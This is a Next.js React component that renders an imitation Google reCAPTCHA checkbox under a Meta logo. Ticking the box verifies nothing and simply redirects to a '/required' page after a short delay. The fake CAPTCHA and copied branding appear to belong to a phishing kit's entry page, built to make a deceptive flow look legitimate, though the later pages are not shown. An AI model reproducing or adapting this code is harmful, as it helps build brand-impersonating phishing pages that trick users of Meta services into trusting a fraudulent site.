'use client'

import React from 'react'
import { useRouter } from 'next/navigation'
import "../checkbox.scss"
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const ReCapcha = () => {
    const [isChecked, setIsChecked] = React.useState(false);
    const { t, i18n } = useTranslation();
    
    const router = useRouter()

    const handleCheckboxClick = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (e.target.checked) {
            setIsChecked(true);
            setTimeout(() => {
                router.push("/required")
            }, 250);
        }
    };

    const handleLabelClick = () => {
        setIsChecked(true);
        setTimeout(() => {
            router.push("/required")
        }, 250);
    };

    return (
        <div className="bg-[#ffffff] flex flex-col items-center justify-start h-screen w-full">
            <div className="font-roboto text-[14px] text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 md:w-[300px]">
                <div className="w-full">
                    <img src="logo-meta.svg" alt="logo" className="w-[64px]" />
                </div>

                <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
                    <div className="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
                        <div className="flex flex-row items-center justify-start ml-[1rem]">
                            <div className='relative w-[30px] h-[30px] flex items-center justify-center'>
                                <label className="checkbox path flex items-center justify-center" onClick={handleLabelClick}>
                                    <input
                                        type="checkbox"
                                        checked={isChecked}
                                        id='checked-capcha'
                                        onChange={handleCheckboxClick}
                                    />
                                    <svg viewBox="0 0 21 21">
                                        <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186"></path>
                                    </svg>
                                </label>
                            </div>
                            <label htmlFor='checked-capcha' className="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal">
                                {t('robot.label')}
                            </label>
                        </div>
                        <div className="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
                            <img src="recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.5rem]" />
                            <span className="text-[10px] font-bold">reCAPTCHA</span>
                            <div className="text-[8px]">Privacy - Terms</div>
                        </div>
                    </div>
                </div>

                <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
                    <p className="font-normal">{t('robot.text-1')}</p>
                    <p className="font-normal mt-4">{t('robot.text-2')}</p>
                    <p className="font-normal mt-4">{t('robot.text-3')}</p>
                </div>
            </div>
        </div>
    )
}

export default ReCapcha
